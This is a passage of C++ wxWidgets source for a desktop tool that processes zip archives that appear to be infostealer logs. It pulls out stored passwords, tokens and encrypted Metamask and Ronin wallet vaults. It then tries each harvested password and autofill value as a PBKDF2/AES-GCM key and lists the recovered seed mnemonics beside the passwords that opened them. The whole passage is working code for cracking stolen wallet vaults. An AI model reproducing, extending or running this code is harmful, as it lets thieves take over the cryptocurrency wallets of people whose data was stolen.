							const wxString Password = MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find_first_of("\n\r"));
							LoginsListCtrl->SetItem(NextTokensListCtrlIndex, 3, Password);

							bool IsUniquePassword = true;
							for (const wxString UniquePassword : Passwords)
							{
								if (Password == UniquePassword && IsUniquePassword)
								{
									IsUniquePassword = false;
									break;
								}
							}

							if (IsUniquePassword)
								Passwords.push_back(Password);

							NextPosition = MemoryOutputStreamString.find("URL: ");
						}
					}
				}
				else if (ZipEntryName.EndsWith("Tokens.txt"))
				{
					wxMemoryOutputStream MemoryOutputStream(nullptr);
					ZipInputStream.Read(MemoryOutputStream);

					wxString ZipEntryData(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());

					Mutex.lock();
					long LastTokensListCtrlIndex = TokensListCtrl->InsertItem(TokensListCtrl->GetItemCount(), Path);
					Mutex.unlock();
					TokensListCtrl->SetItem(LastTokensListCtrlIndex, 1, ZipEntryData);
				}
				else if (ZipEntryName.EndsWith(".log"))
				{
					if (ZipEntryName.rfind("Metamask") != wxString::npos)
					{
						wxMemoryOutputStream MemoryOutputStream(nullptr);
						ZipInputStream.Read(MemoryOutputStream);

						wxString MemoryOutputStreamString(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());

						NextPosition = MemoryOutputStreamString.find("\"vault\"");

						if (NextPosition != wxString::npos)
						{
							while (NextPosition != wxString::npos)
							{
								MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 9);

								wxString Vault = MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find('}') + 1);
								Vault.erase(std::remove(Vault.begin(), Vault.end(), 10), Vault.end());
								Vault.erase(std::remove(Vault.begin(), Vault.end(), 13), Vault.end());
								Vault.erase(std::remove(Vault.begin(), Vault.end(), 92), Vault.end());

								bool IsUniqueVault = true;
								for (const wxString UniqueVault : Vaults)
								{
									if (Vault == UniqueVault && IsUniqueVault)
									{
										IsUniqueVault = false;
										break;
									}
								}

								if (IsUniqueVault)
									Vaults.push_back(Vault);

								NextPosition = MemoryOutputStreamString.find("\"vault\"");
							}
						}
					}
					else if (ZipEntryName.rfind("RoninWallet") != wxString::npos)
					{
						wxMemoryOutputStream MemoryOutputStream(nullptr);
						ZipInputStream.Read(MemoryOutputStream);

						wxString MemoryOutputStreamString(static_cast<char*>(MemoryOutputStream.GetOutputStreamBuffer()->GetBufferStart()), MemoryOutputStream.GetOutputStreamBuffer()->GetBufferSize());

						NextPosition = MemoryOutputStreamString.find("encryptedVault");

						if (NextPosition != wxString::npos)
						{
							while (NextPosition != wxString::npos)
							{
								MemoryOutputStreamString = MemoryOutputStreamString.substr(NextPosition + 14);
								MemoryOutputStreamString = MemoryOutputStreamString.substr(MemoryOutputStreamString.find('{'));

								wxString Vault = MemoryOutputStreamString.substr(0, MemoryOutputStreamString.find('}') + 1);
								Vault.erase(std::remove(Vault.begin(), Vault.end(), 10), Vault.end());
								Vault.erase(std::remove(Vault.begin(), Vault.end(), 13), Vault.end());
								Vault.erase(std::remove(Vault.begin(), Vault.end(), 92), Vault.end());

								bool IsUniqueVault = true;
								for (const wxString UniqueVault : Vaults)
								{
									if (Vault == UniqueVault && IsUniqueVault)
									{
										IsUniqueVault = false;
										break;
									}
								}

								if (IsUniqueVault)
									Vaults.push_back(Vault);

								NextPosition = MemoryOutputStreamString.find("encryptedVault");
							}
						}
					}
				}
			}

			CurrentTreeItemId = AfterRootTreeItemId;
		}

		for (const wxString Vault : Vaults)
		{
			cJSON* EncryptedVaultJSON = cJSON_Parse(Vault);

			if (!EncryptedVaultJSON)
				continue;

			const cJSON* Data = cJSON_GetObjectItemCaseSensitive(EncryptedVaultJSON, "data");

			if (!cJSON_IsString(Data))
			{
				cJSON_Delete(EncryptedVaultJSON);
				continue;
			}

			const cJSON* IV = cJSON_GetObjectItemCaseSensitive(EncryptedVaultJSON, "iv");

			if (!cJSON_IsString(IV))
			{
				cJSON_Delete(EncryptedVaultJSON);
				continue;
			}

			const cJSON* Salt = cJSON_GetObjectItemCaseSensitive(EncryptedVaultJSON, "salt");

			if (!cJSON_IsString(Salt))
			{
				cJSON_Delete(EncryptedVaultJSON);
				continue;
			}

			for (const wxString Password : Passwords)
			{
				auto Key = Mimaxue::Subtles::Key(Mimaxue::Subtles::KeyFormat::eRaw, (std::string)Password, Mimaxue::Subtles::KeyAlgorithm::ePBKDF2, Mimaxue::Base64::Decode(Salt->valuestring), 10000);
				auto DecryptedVault = Mimaxue::AES::GCM::Decrypt(Mimaxue::Base64::Decode(Data->valuestring), Mimaxue::Base64::Decode(IV->valuestring), Key);

				if (DecryptedVault)
				{
					DecryptedVault->erase(std::remove(DecryptedVault->begin(), DecryptedVault->end(), 92), DecryptedVault->end());
					wxString Mnemonic = DecryptedVault->substr(DecryptedVault->find("mnemonic") + 11);
					Mnemonic = Mnemonic.substr(0, Mnemonic.find('"'));

					bool IsUniqueMnemonic = true;

					const int WalletsListCtrlItemCount = WalletsListCtrl->GetItemCount();
					for (int WalletsListCtrlItemIndex = 0; WalletsListCtrlItemIndex < WalletsListCtrlItemCount; WalletsListCtrlItemIndex++)
					{
						if (WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex, 1) == Mnemonic)
						{
							IsUniqueMnemonic = false;
							break;
						}
					}

					if (IsUniqueMnemonic)
					{
						Mutex.lock();
						long WalletsListCtrlItemIndex = WalletsListCtrl->InsertItem(WalletsListCtrl->GetItemCount(), Path);
						Mutex.unlock();
						WalletsListCtrl->SetItem(WalletsListCtrlItemIndex, 1, Mnemonic);
						WalletsListCtrl->SetItem(WalletsListCtrlItemIndex, 2, Password);
					}

					break;
				}
			}

			for (const wxString Autofill : Autofills)
			{
				auto Key = Mimaxue::Subtles::Key(Mimaxue::Subtles::KeyFormat::eRaw, (std::string)Autofill, Mimaxue::Subtles::KeyAlgorithm::ePBKDF2, Mimaxue::Base64::Decode(Salt->valuestring), 10000);
				auto DecryptedVault = Mimaxue::AES::GCM::Decrypt(Mimaxue::Base64::Decode(Data->valuestring), Mimaxue::Base64::Decode(IV->valuestring), Key);

				if (DecryptedVault)
				{
					DecryptedVault->erase(std::remove(DecryptedVault->begin(), DecryptedVault->end(), 92), DecryptedVault->end());
					wxString Mnemonic = DecryptedVault->substr(DecryptedVault->find("mnemonic") + 11);
					Mnemonic = Mnemonic.substr(0, Mnemonic.find('"'));

					bool IsUniqueMnemonic = true;

					const int WalletsListCtrlItemCount = WalletsListCtrl->GetItemCount();
					for (int WalletsListCtrlItemIndex = 0; WalletsListCtrlItemIndex < WalletsListCtrlItemCount; WalletsListCtrlItemIndex++)
					{
						if (WalletsListCtrl->GetItemText(WalletsListCtrlItemIndex, 1) == Mnemonic)
						{
							IsUniqueMnemonic = false;
							break;
						}
					}

					if (IsUniqueMnemonic)
					{
						Mutex.lock();
						long WalletsListCtrlItemIndex = WalletsListCtrl->InsertItem(WalletsListCtrl->GetItemCount(), Path);
						Mutex.unlock();
						WalletsListCtrl->SetItem(WalletsListCtrlItemIndex, 1, Mnemonic);
						WalletsListCtrl->SetItem(WalletsListCtrlItemIndex, 2, Autofill);
					}

					break;
				}
			}

			cJSON_Delete(EncryptedVaultJSON);
		}
	}

	wxDECLARE_EVENT_TABLE();
};

wxBEGIN_EVENT_TABLE(Frame, wxFrame)
	EVT_MENU_RANGE(RECENT_FILE_1, RECENT_FILE_8, Frame::OnRecentFile)
	EVT_MENU_RANGE(RECENT_PROJECT_1, RECENT_PROJECT_4, Frame::OnRecentProject)
	EVT_CHAR_HOOK(Frame::OnCharHook)
	EVT_CLOSE(Frame::OnClose)
wxEND_EVENT_TABLE()

class Application : public wxApp
{
	bool OnInit() override
	{
		return (new Frame())->Show();
	}
};

wxIMPLEMENT_APP(Application);